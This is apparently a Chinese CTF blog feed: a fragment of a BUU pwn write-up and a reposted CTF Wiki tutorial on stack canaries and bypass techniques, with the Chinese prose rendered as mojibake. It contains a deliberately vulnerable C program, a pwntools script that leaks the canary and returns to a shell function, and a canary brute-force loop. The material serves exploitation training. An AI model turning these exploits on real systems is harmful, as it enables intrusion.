<p>å¼€å¯äº†relroå’Œnxï¼Œæ¯”è¾ƒå¸¸è§çš„ä¿æŠ¤æªæ–½ã€‚è¿è¡Œä¸€ä¸‹çœ‹çœ‹æœ‰ä»€ä¹ˆä¸œè¥¿</p>
<p><img src="/2021/04/04/2021-04-04-buu01/QQ%E5%9B%BE%E7%89%8720210404195052.png"></p>
<p>è¾“å…¥2ç›´æ¥æ— é™å¾ªç¯äº†ï¼Œæ¯«æ— æ„ä¹‰ï¼Œè¾“å…¥3é€€å‡ºï¼Œè¾“å…¥1ä¼¼ä¹ä¼šç»è¿‡ä¸€äº›çš„è¿ç®—è¿˜æ˜¯ä»€ä¹ˆï¼Œè¿›å…¥idaçœ‹çœ‹</p>
<p><img src="/2021/04/04/2021-04-04-buu01/QQ%E5%9B%BE%E7%89%8720210404195229.png"></p>
<p>è·Ÿè¿è¡Œå¹¶æ— å¤ªå¤§å·®åˆ«ï¼Œåªæœ‰è¯¦ç»†çœ‹çœ‹1çš„å‡½æ•°é‡Œé¢æœ‰æ²¡æœ‰ä»€ä¹ˆæ¼æ´ã€‚å½“çœ‹åˆ°__int16 v3ï¼Œè¿˜ä»¥ä¸ºå¯èƒ½å‡ºç°æ•´æ•°æº¢å‡ºï¼Œå¯æƒœå°±æ˜¯æˆ‘æƒ³å¤šäº†</p>
<p><img src="/2021/04/04/2021-04-04-buu01/QQ%E5%9B%BE%E7%89%8720210404195357.png"></p>
<p><img src="/2021/04/04/2021-04-04-buu01/QQ%E5%9B%BE%E7%89%8720210404195534.png"></p>
<p>è¿™é‡Œæœ‰ä¸€ä¸ªæ— é™è¾“å…¥ï¼Œå¯ä»¥å¾ˆè½»æ˜“è¦†ç›–åˆ°è¿”å›åœ°å€ï¼Œç”±äºé™„ä»¶é‡Œé¢æ²¡æœ‰åé—¨å‡½æ•°ï¼Œå¾ˆæ˜æ˜¾çš„ropäº†</p>
<p><img src="/2021/04/04/2021-04-04-buu01/QQ%E5%9B%BE%E7%89%8720210404195804.png"></p>
<p>å› ä¸ºè¦çœŸæ­£èƒ½åˆ°é€€æ ˆè¿›è¡Œåœ°å€è·³è½¬ï¼Œå°±è¦å…ˆæŠŠæ•´ä¸ªå‡½æ•°çš„ç¨‹åºæµæ‰§è¡Œå®Œæ¯•æ‰èƒ½å‘ç”Ÿé€€æ ˆã€‚è¿™é‡Œç»•è¿‡å°±æ˜¯å› ä¸ºstrlen()é‡åˆ°â€™\0â€™å°±ä¼šåœæ­¢ï¼Œåˆ©ç”¨è¿™ç‚¹å¯ä»¥ç›´æ¥é€€å‡ºå¾ªç¯ï¼Œåœ¨è¿™é¢˜é‡Œé¢è¿˜æœ‰ä¸ªéœ€è¦æ³¨æ„çš„ç‚¹å°±æ˜¯è¿™é‡Œçš„ä»£ç </p>
<p><img src="/2021/04/04/2021-04-04-buu01/QQ%E5%9B%BE%E7%89%8720210404202418.png"></p>
<p>è¿™é‡Œè¿˜æœ‰ä¸¤ä¸ªè¾“å‡ºï¼Œéœ€è¦æ¥æ”¶äº†ï¼Œå¦åˆ™ä¼šå½±å“gotè¡¨çš„æ³„éœ²ï¼Œexpå¦‚ä¸‹ï¼š</p>
<p><img src="/2021/04/04/2021-04-04-buu01/QQ%E5%9B%BE%E7%89%8720210404202427.png"></p>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>canaryç»•è¿‡</title>
    <url>/2021/03/28/2021-03-28-canary%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<h2 id="è½¬è½½è‡ªctf-wiki"><a href="#è½¬è½½è‡ªctf-wiki" class="headerlink" title="è½¬è½½è‡ªctf wiki"></a>è½¬è½½è‡ªctf wiki</h2><h1 id="ä¸€ã€Canary"><a href="#ä¸€ã€Canary" class="headerlink" title="ä¸€ã€Canary"></a>ä¸€ã€Canary</h1><h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><p>Canary çš„æ„æ€æ˜¯é‡‘ä¸é›€ï¼Œæ¥æºäºè‹±å›½çŸ¿äº•å·¥äººç”¨æ¥æ¢æŸ¥äº•ä¸‹æ°”ä½“æ˜¯å¦æœ‰æ¯’çš„é‡‘ä¸é›€ç¬¼å­ã€‚å·¥äººä»¬æ¯æ¬¡ä¸‹äº•éƒ½ä¼šå¸¦ä¸Šä¸€åªé‡‘ä¸é›€ã€‚å¦‚æœäº•ä¸‹çš„æ°”ä½“æœ‰æ¯’ï¼Œé‡‘ä¸é›€ç”±äºå¯¹æ¯’æ€§æ•æ„Ÿå°±ä¼šåœæ­¢é¸£å«ç”šè‡³æ­»äº¡ï¼Œä»è€Œä½¿å·¥äººä»¬å¾—åˆ°é¢„è­¦ã€‚</p>
<p>æˆ‘ä»¬çŸ¥é“ï¼Œé€šå¸¸æ ˆæº¢å‡ºçš„åˆ©ç”¨æ–¹å¼æ˜¯é€šè¿‡æº¢å‡ºå­˜åœ¨äºæ ˆä¸Šçš„å±€éƒ¨å˜é‡ï¼Œä»è€Œè®©å¤šå‡ºæ¥çš„æ•°æ®è¦†ç›– ebpã€eip ç­‰ï¼Œä»è€Œè¾¾åˆ°åŠ«æŒæ§åˆ¶æµçš„ç›®çš„ã€‚æ ˆæº¢å‡ºä¿æŠ¤æ˜¯ä¸€ç§ç¼“å†²åŒºæº¢å‡ºæ”»å‡»ç¼“è§£æ‰‹æ®µï¼Œå½“å‡½æ•°å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ”»å‡»æ¼æ´æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥è¦†ç›–æ ˆä¸Šçš„è¿”å›åœ°å€æ¥è®© shellcode èƒ½å¤Ÿå¾—åˆ°æ‰§è¡Œã€‚å½“å¯ç”¨æ ˆä¿æŠ¤åï¼Œå‡½æ•°å¼€å§‹æ‰§è¡Œçš„æ—¶å€™ä¼šå…ˆå¾€æ ˆåº•æ’å…¥ cookie ä¿¡æ¯ï¼Œå½“å‡½æ•°çœŸæ­£è¿”å›çš„æ—¶å€™ä¼šéªŒè¯ cookie ä¿¡æ¯æ˜¯å¦åˆæ³•(æ ˆå¸§é”€æ¯å‰æµ‹è¯•è¯¥å€¼æ˜¯å¦è¢«æ”¹å˜)ï¼Œå¦‚æœä¸åˆæ³•å°±åœæ­¢ç¨‹åºè¿è¡Œ(æ ˆæº¢å‡ºå‘ç”Ÿ)ã€‚æ”»å‡»è€…åœ¨è¦†ç›–è¿”å›åœ°å€çš„æ—¶å€™å¾€å¾€ä¹Ÿä¼šå°† cookie ä¿¡æ¯ç»™è¦†ç›–æ‰ï¼Œå¯¼è‡´æ ˆä¿æŠ¤æ£€æŸ¥å¤±è´¥è€Œé˜»æ­¢ shellcode çš„æ‰§è¡Œï¼Œé¿å…æ¼æ´åˆ©ç”¨æˆåŠŸã€‚åœ¨ Linux ä¸­æˆ‘ä»¬å°† cookie ä¿¡æ¯ç§°ä¸º Canaryã€‚</p>
<p>ç”±äº stack overflow è€Œå¼•å‘çš„æ”»å‡»éå¸¸æ™®éä¹Ÿéå¸¸å¤è€ï¼Œç›¸åº”åœ°ä¸€ç§å«åš Canary çš„ mitigation æŠ€æœ¯å¾ˆæ—©å°±å‡ºç°åœ¨ glibc é‡Œï¼Œç›´åˆ°ç°åœ¨ä¹Ÿä½œä¸ºç³»ç»Ÿå®‰å…¨çš„ç¬¬ä¸€é“é˜²çº¿å­˜åœ¨ã€‚</p>
<p>Canary ä¸ç®¡æ˜¯å®ç°è¿˜æ˜¯è®¾è®¡æ€æƒ³éƒ½æ¯”è¾ƒç®€å•é«˜æ•ˆï¼Œå°±æ˜¯æ’å…¥ä¸€ä¸ªå€¼åœ¨ stack overflow å‘ç”Ÿçš„é«˜å±åŒºåŸŸçš„å°¾éƒ¨ã€‚å½“å‡½æ•°è¿”å›ä¹‹æ—¶æ£€æµ‹ Canary çš„å€¼æ˜¯å¦ç»è¿‡äº†æ”¹å˜ï¼Œä»¥æ­¤æ¥åˆ¤æ–­ stack/buffer overflow æ˜¯å¦å‘ç”Ÿã€‚</p>
<p>Canary ä¸ Windows ä¸‹çš„ GS ä¿æŠ¤éƒ½æ˜¯ç¼“è§£æ ˆæº¢å‡ºæ”»å‡»çš„æœ‰æ•ˆæ‰‹æ®µï¼Œå®ƒçš„å‡ºç°å¾ˆå¤§ç¨‹åº¦ä¸Šå¢åŠ äº†æ ˆæº¢å‡ºæ”»å‡»çš„éš¾åº¦ï¼Œå¹¶ä¸”ç”±äºå®ƒå‡ ä¹å¹¶ä¸æ¶ˆè€—ç³»ç»Ÿèµ„æºï¼Œæ‰€ä»¥ç°åœ¨æˆäº† Linux ä¸‹ä¿æŠ¤æœºåˆ¶çš„æ ‡é…ã€‚</p>
<h2 id="Canary-åŸç†"><a href="#Canary-åŸç†" class="headerlink" title="Canary åŸç†"></a>Canary åŸç†</h2><h3 id="åœ¨-GCC-ä¸­ä½¿ç”¨-Canary"><a href="#åœ¨-GCC-ä¸­ä½¿ç”¨-Canary" class="headerlink" title="åœ¨ GCC ä¸­ä½¿ç”¨ Canary"></a>åœ¨ GCC ä¸­ä½¿ç”¨ Canary</h3><p>å¯ä»¥åœ¨ GCC ä¸­ä½¿ç”¨ä»¥ä¸‹å‚æ•°è®¾ç½® Canary:</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-fstack-protector å¯ç”¨ä¿æŠ¤ï¼Œä¸è¿‡åªä¸ºå±€éƒ¨å˜é‡ä¸­å«æœ‰æ•°ç»„çš„å‡½æ•°æ’å…¥ä¿æŠ¤</span><br><span class="hljs-deletion">-fstack-protector-all å¯ç”¨ä¿æŠ¤ï¼Œä¸ºæ‰€æœ‰å‡½æ•°æ’å…¥ä¿æŠ¤</span><br><span class="hljs-deletion">-fstack-protector-strong</span><br><span class="hljs-deletion">-fstack-protector-explicit åªå¯¹æœ‰æ˜ç¡® stack_protect attribute çš„å‡½æ•°å¼€å¯ä¿æŠ¤</span><br><span class="hljs-deletion">-fno-stack-protector ç¦ç”¨ä¿æŠ¤</span><br></code></pre></td></tr></table></figure>

<h3 id="Canary-å®ç°åŸç†"><a href="#Canary-å®ç°åŸç†" class="headerlink" title="Canary å®ç°åŸç†"></a>Canary å®ç°åŸç†</h3><p>å¼€å¯ Canary ä¿æŠ¤çš„ stack ç»“æ„å¤§æ¦‚å¦‚ä¸‹ï¼š</p>
<figure class="highlight gherkin"><table><tr><td class="code"><pre><code class="hljs gherkin">  High<br>  Address |<span class="hljs-string">                 </span>|<br>          +-----------------+<br>          |<span class="hljs-string"> args            </span>|<br>          +-----------------+<br>          |<span class="hljs-string"> return address  </span>|<br>          +-----------------+<br>  rbp =&gt;  |<span class="hljs-string"> old ebp         </span>|<br>          +-----------------+<br>rbp-8 =&gt;  |<span class="hljs-string"> canary value    </span>|<br>          +-----------------+<br>          |<span class="hljs-string"> local variables </span>|<br>  Low     |<span class="hljs-string">                 </span>|<br>  Address<br><br></code></pre></td></tr></table></figure>

<p>å½“ç¨‹åºå¯ç”¨ Canary ç¼–è¯‘åï¼Œåœ¨å‡½æ•°åºè¨€éƒ¨åˆ†ä¼šå– fs å¯„å­˜å™¨ 0x28 å¤„çš„å€¼ï¼Œå­˜æ”¾åœ¨æ ˆä¸­ebp-0x8 çš„ä½ç½®ã€‚<br>è¿™ä¸ªæ“ä½œå³ä¸ºå‘æ ˆä¸­æ’å…¥ Canary å€¼ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs asm">mov    rax, qword ptr fs:[0x28]<br>mov    qword ptr [rbp - 8], rax<br></code></pre></td></tr></table></figure>

<p>åœ¨å‡½æ•°è¿”å›ä¹‹å‰ï¼Œä¼šå°†è¯¥å€¼å–å‡ºï¼Œå¹¶ä¸ fs:0x28 çš„å€¼è¿›è¡Œå¼‚æˆ–ã€‚å¦‚æœå¼‚æˆ–çš„ç»“æœä¸º 0ï¼Œè¯´æ˜ Canary æœªè¢«ä¿®æ”¹ï¼Œå‡½æ•°ä¼šæ­£å¸¸è¿”å›ï¼Œè¿™ä¸ªæ“ä½œå³ä¸ºæ£€æµ‹æ˜¯å¦å‘ç”Ÿæ ˆæº¢å‡ºã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs asm">mov    rdx,QWORD PTR [rbp-0x8]<br>xor    rdx,QWORD PTR fs:0x28<br>je     0x4005d7 &lt;main+65&gt;<br>call   0x400460 &lt;__stack_chk_fail@plt&gt;<br></code></pre></td></tr></table></figure>

<p>å¦‚æœ Canary å·²ç»è¢«éæ³•ä¿®æ”¹ï¼Œæ­¤æ—¶ç¨‹åºæµç¨‹ä¼šèµ°åˆ° <code>__stack_chk_fail</code>ã€‚<code>__stack_chk_fail</code> ä¹Ÿæ˜¯ä½äº glibc ä¸­çš„å‡½æ•°ï¼Œé»˜è®¤æƒ…å†µä¸‹ç»è¿‡ ELF çš„å»¶è¿Ÿç»‘å®šï¼Œå®šä¹‰å¦‚ä¸‹ã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs C">eglibc<span class="hljs-number">-2.19</span>/debug/stack_chk_fail.c<br><br><span class="hljs-keyword">void</span> __attribute__ ((noreturn)) __stack_chk_fail (<span class="hljs-keyword">void</span>)<br>&#123;<br>  __fortify_fail (<span class="hljs-string">&quot;stack smashing detected&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">void</span> __attribute__ ((noreturn)) internal_function __fortify_fail (<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *msg)<br>&#123;<br>  <span class="hljs-comment">/* The loop is added only to keep gcc happy.  */</span><br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    __libc_message (<span class="hljs-number">2</span>, <span class="hljs-string">&quot;*** %s ***: %s terminated\n&quot;</span>,<br>                    msg, __libc_argv[<span class="hljs-number">0</span>] ?: <span class="hljs-string">&quot;&lt;unknown&gt;&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è¿™æ„å‘³å¯ä»¥é€šè¿‡åŠ«æŒ <code>__stack_chk_fail</code> çš„ got å€¼åŠ«æŒæµç¨‹æˆ–è€…åˆ©ç”¨ <code>__stack_chk_fail</code> æ³„æ¼å†…å®¹(å‚è§ stack smash)ã€‚</p>
<p>è¿›ä¸€æ­¥ï¼Œå¯¹äº Linux æ¥è¯´ï¼Œfs å¯„å­˜å™¨å®é™…æŒ‡å‘çš„æ˜¯å½“å‰æ ˆçš„ TLS ç»“æ„ï¼Œfs:0x28 æŒ‡å‘çš„æ­£æ˜¯ stack_guardã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-keyword">void</span> *tcb;        <span class="hljs-comment">/* Pointer to the TCB.  Not necessarily the</span><br><span class="hljs-comment">                       thread descriptor used by libpthread.  */</span><br>  <span class="hljs-keyword">dtv_t</span> *dtv;<br>  <span class="hljs-keyword">void</span> *self;       <span class="hljs-comment">/* Pointer to the thread descriptor.  */</span><br>  <span class="hljs-keyword">int</span> multiple_threads;<br>  <span class="hljs-keyword">uintptr_t</span> sysinfo;<br>  <span class="hljs-keyword">uintptr_t</span> stack_guard;<br>  ...<br>&#125; <span class="hljs-keyword">tcbhead_t</span>;<br></code></pre></td></tr></table></figure>

<p>å¦‚æœå­˜åœ¨æº¢å‡ºå¯ä»¥è¦†ç›–ä½äº TLS ä¸­ä¿å­˜çš„ Canary å€¼é‚£ä¹ˆå°±å¯ä»¥å®ç°ç»•è¿‡ä¿æŠ¤æœºåˆ¶ã€‚</p>
<p>äº‹å®ä¸Šï¼ŒTLS ä¸­çš„å€¼ç”±å‡½æ•° security_init è¿›è¡Œåˆå§‹åŒ–ã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">security_init</span> <span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-comment">// _dl_randomçš„å€¼åœ¨è¿›å…¥è¿™ä¸ªå‡½æ•°çš„æ—¶å€™å°±å·²ç»ç”±kernelå†™å…¥.</span><br>  <span class="hljs-comment">// glibcç›´æ¥ä½¿ç”¨äº†_dl_randomçš„å€¼å¹¶æ²¡æœ‰ç»™èµ‹å€¼</span><br>  <span class="hljs-comment">// å¦‚æœä¸é‡‡ç”¨è¿™ç§æ¨¡å¼, glibcä¹Ÿå¯ä»¥è‡ªå·±äº§ç”Ÿéšæœºæ•°</span><br><br>  <span class="hljs-comment">//å°†_dl_randomçš„æœ€åä¸€ä¸ªå­—èŠ‚è®¾ç½®ä¸º0x0</span><br>  <span class="hljs-keyword">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);<br>  <br>  <span class="hljs-comment">// è®¾ç½®Canaryçš„å€¼åˆ°TLSä¸­</span><br>  THREAD_SET_STACK_GUARD (stack_chk_guard);<br><br>  _dl_random = <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-comment">//THREAD_SET_STACK_GUARDå®ç”¨äºè®¾ç½®TLS</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> THREAD_SET_STACK_GUARD(value) \</span><br><span class="hljs-meta">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span><br><br></code></pre></td></tr></table></figure>


<h2 id="Canary-ç»•è¿‡æŠ€æœ¯"><a href="#Canary-ç»•è¿‡æŠ€æœ¯" class="headerlink" title="Canary ç»•è¿‡æŠ€æœ¯"></a>Canary ç»•è¿‡æŠ€æœ¯</h2><h3 id="åºè¨€"><a href="#åºè¨€" class="headerlink" title="åºè¨€"></a>åºè¨€</h3><p>Canary æ˜¯ä¸€ç§ååˆ†æœ‰æ•ˆçš„è§£å†³æ ˆæº¢å‡ºé—®é¢˜çš„æ¼æ´ç¼“è§£æªæ–½ã€‚ä½†æ˜¯å¹¶ä¸æ„å‘³ç€ Canary å°±èƒ½å¤Ÿé˜»æ­¢æ‰€æœ‰çš„æ ˆæº¢å‡ºåˆ©ç”¨ï¼Œåœ¨è¿™é‡Œç»™å‡ºäº†å¸¸è§çš„å­˜åœ¨ Canary çš„æ ˆæº¢å‡ºåˆ©ç”¨æ€è·¯ï¼Œè¯·æ³¨æ„æ¯ç§æ–¹æ³•éƒ½æœ‰ç‰¹å®šçš„ç¯å¢ƒè¦æ±‚ã€‚</p>
<h3 id="æ³„éœ²æ ˆä¸­çš„-Canary"><a href="#æ³„éœ²æ ˆä¸­çš„-Canary" class="headerlink" title="æ³„éœ²æ ˆä¸­çš„ Canary"></a>æ³„éœ²æ ˆä¸­çš„ Canary</h3><p>Canary è®¾è®¡ä¸ºä»¥å­—èŠ‚ <code>\x00</code> ç»“å°¾ï¼Œæœ¬æ„æ˜¯ä¸ºäº†ä¿è¯ Canary å¯ä»¥æˆªæ–­å­—ç¬¦ä¸²ã€‚<br>æ³„éœ²æ ˆä¸­çš„ Canary çš„æ€è·¯æ˜¯è¦†ç›– Canary çš„ä½å­—èŠ‚ï¼Œæ¥æ‰“å°å‡ºå‰©ä½™çš„ Canary éƒ¨åˆ†ã€‚<br>è¿™ç§åˆ©ç”¨æ–¹å¼éœ€è¦å­˜åœ¨åˆé€‚çš„è¾“å‡ºå‡½æ•°ï¼Œå¹¶ä¸”å¯èƒ½éœ€è¦ç¬¬ä¸€æº¢å‡ºæ³„éœ² Canaryï¼Œä¹‹åå†æ¬¡æº¢å‡ºæ§åˆ¶æ‰§è¡Œæµç¨‹ã€‚</p>
<h4 id="åˆ©ç”¨ç¤ºä¾‹"><a href="#åˆ©ç”¨ç¤ºä¾‹" class="headerlink" title="åˆ©ç”¨ç¤ºä¾‹"></a>åˆ©ç”¨ç¤ºä¾‹</h4><p>å­˜åœ¨æ¼æ´çš„ç¤ºä¾‹æºä»£ç å¦‚ä¸‹:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs C"><span class="hljs-comment">// ex2.c</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">getshell</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span> </span>&#123;<br>    setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br>    setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-literal">NULL</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">vuln</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">100</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">2</span>;i++)&#123;<br>        read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x200</span>);<br>        <span class="hljs-built_in">printf</span>(buf);<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>    init();<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Hello Hacker!&quot;</span>);<br>    vuln();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ç¼–è¯‘ä¸º 32bit ç¨‹åºå¹¶å…³é—­ PIE ä¿æŠ¤ ï¼ˆé»˜è®¤å¼€å¯ NXï¼ŒASLRï¼ŒCanary ä¿æŠ¤ï¼‰</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ gcc -m32 -no-pie ex2.c -o ex2<br></code></pre></td></tr></table></figure>

<p>é¦–å…ˆé€šè¿‡è¦†ç›– Canary æœ€åä¸€ä¸ª <code>\x00</code> å­—èŠ‚æ¥æ‰“å°å‡º 4 ä½çš„ Canary<br>ä¹‹åï¼Œè®¡ç®—å¥½åç§»ï¼Œå°† Canary å¡«å…¥åˆ°ç›¸åº”çš„æº¢å‡ºä½ç½®ï¼Œå®ç° Ret åˆ° getshell å‡½æ•°ä¸­</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.binary = <span class="hljs-string">&#x27;ex2&#x27;</span><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>io = process(<span class="hljs-string">&#x27;./ex2&#x27;</span>)<br><br>get_shell = ELF(<span class="hljs-string">&quot;./ex2&quot;</span>).sym[<span class="hljs-string">&quot;getshell&quot;</span>]<br><br>io.recvuntil(<span class="hljs-string">&quot;Hello Hacker!\n&quot;</span>)<br><br><span class="hljs-comment"># leak Canary</span><br>payload = <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">100</span><br>io.sendline(payload)<br><br>io.recvuntil(<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">100</span>)<br>Canary = u32(io.recv(<span class="hljs-number">4</span>))-<span class="hljs-number">0xa</span><br>log.info(<span class="hljs-string">&quot;Canary:&quot;</span>+<span class="hljs-built_in">hex</span>(Canary))<br><br><span class="hljs-comment"># Bypass Canary</span><br>payload = <span class="hljs-string">&quot;\x90&quot;</span>*<span class="hljs-number">100</span>+p32(Canary)+<span class="hljs-string">&quot;\x90&quot;</span>*<span class="hljs-number">12</span>+p32(get_shell)<br>io.send(payload)<br><br>io.recv()<br><br>io.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="one-by-one-çˆ†ç ´-Canary"><a href="#one-by-one-çˆ†ç ´-Canary" class="headerlink" title="one-by-one çˆ†ç ´ Canary"></a>one-by-one çˆ†ç ´ Canary</h3><p>å¯¹äº Canaryï¼Œè™½ç„¶æ¯æ¬¡è¿›ç¨‹é‡å¯åçš„ Canary ä¸åŒ(ç›¸æ¯” GSï¼ŒGS é‡å¯åæ˜¯ç›¸åŒçš„)ï¼Œä½†æ˜¯åŒä¸€ä¸ªè¿›ç¨‹ä¸­çš„ä¸åŒçº¿ç¨‹çš„ Canary æ˜¯ç›¸åŒçš„ï¼Œ å¹¶ä¸”<br>é€šè¿‡ fork å‡½æ•°åˆ›å»ºçš„å­è¿›ç¨‹çš„ Canary ä¹Ÿæ˜¯ç›¸åŒçš„ï¼Œå› ä¸º fork å‡½æ•°ä¼šç›´æ¥æ‹·è´çˆ¶è¿›ç¨‹çš„å†…å­˜ã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™æ ·çš„ç‰¹ç‚¹ï¼Œå½»åº•é€ä¸ªå­—èŠ‚å°† Canary çˆ†ç ´å‡ºæ¥ã€‚<br>åœ¨è‘—åçš„ offset2libc ç»•è¿‡ linux64bit çš„æ‰€æœ‰ä¿æŠ¤çš„æ–‡ç« ä¸­ï¼Œä½œè€…å°±æ˜¯åˆ©ç”¨è¿™æ ·çš„æ–¹å¼çˆ†ç ´å¾—åˆ°çš„ Canary:<br>è¿™æ˜¯çˆ†ç ´çš„ Python ä»£ç :</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] Brute forcing stack canary &quot;</span><br><br>start = <span class="hljs-built_in">len</span>(p)<br>stop = <span class="hljs-built_in">len</span>(p)+<span class="hljs-number">8</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(p) &lt; stop:<br>   <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">0</span>,<span class="hljs-number">256</span>):<br>      res = send2server(p + <span class="hljs-built_in">chr</span>(i))<br><br>      <span class="hljs-keyword">if</span> res != <span class="hljs-string">&quot;&quot;</span>:<br>         p = p + <span class="hljs-built_in">chr</span>(i)<br>         <span class="hljs-comment">#print &quot;\t[+] Byte found 0x%02x&quot; % i</span><br>         <span class="hljs-keyword">break</span><br><br>      <span class="hljs-keyword">if</span> i == <span class="hljs-number">255</span>:<br>         <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[-] Exploit failed&quot;</span><br>         sys.exit(-<span class="hljs-number">1</span>)<br><br><br>canary = p[stop:start-<span class="hljs-number">1</span>:-<span class="hljs-number">1</span>].encode(<span class="hljs-string">&quot;hex&quot;</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;   [+] SSP value is 0x%s&quot;</span> % canary<br></code></pre></td></tr></table></figure>


<h3 id="åŠ«æŒ-stack-chk-failå‡½æ•°"><a href="#åŠ«æŒ-stack-chk-failå‡½æ•°" class="headerlink" title="åŠ«æŒ__stack_chk_failå‡½æ•°"></a>åŠ«æŒ__stack_chk_failå‡½æ•°</h3><p>å·²çŸ¥ Canary å¤±è´¥çš„å¤„ç†é€»è¾‘ä¼šè¿›å…¥åˆ° <code>__stack_chk_fail</code>ed å‡½æ•°ï¼Œ<code>__stack_chk_fail</code>ed å‡½æ•°æ˜¯ä¸€ä¸ªæ™®é€šçš„å»¶è¿Ÿç»‘å®šå‡½æ•°ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹ GOT è¡¨åŠ«æŒè¿™ä¸ªå‡½æ•°ã€‚</p>
<p>å‚è§ ZCTF2017 Loginï¼Œåˆ©ç”¨æ–¹å¼æ˜¯é€šè¿‡ fsb æ¼æ´ç¯¡æ”¹ <code>__stack_chk_fail</code> çš„ GOT è¡¨ï¼Œå†è¿›è¡Œ ROP åˆ©ç”¨</p>
<h3 id="è¦†ç›–-TLS-ä¸­å‚¨å­˜çš„-Canary-å€¼"><a href="#è¦†ç›–-TLS-ä¸­å‚¨å­˜çš„-Canary-å€¼" class="headerlink" title="è¦†ç›– TLS ä¸­å‚¨å­˜çš„ Canary å€¼"></a>è¦†ç›– TLS ä¸­å‚¨å­˜çš„ Canary å€¼</h3><p>å·²çŸ¥ Canary å‚¨å­˜åœ¨ TLS ä¸­ï¼Œåœ¨å‡½æ•°è¿”å›å‰ä¼šä½¿ç”¨è¿™ä¸ªå€¼è¿›è¡Œå¯¹æ¯”ã€‚å½“æº¢å‡ºå°ºå¯¸è¾ƒå¤§æ—¶ï¼Œå¯ä»¥åŒæ—¶è¦†ç›–æ ˆä¸Šå‚¨å­˜çš„ Canary å’Œ TLS å‚¨å­˜çš„ Canary å®ç°ç»•è¿‡ã€‚</p>
<p>å‚è§ StarCTF2018 babystack</p>
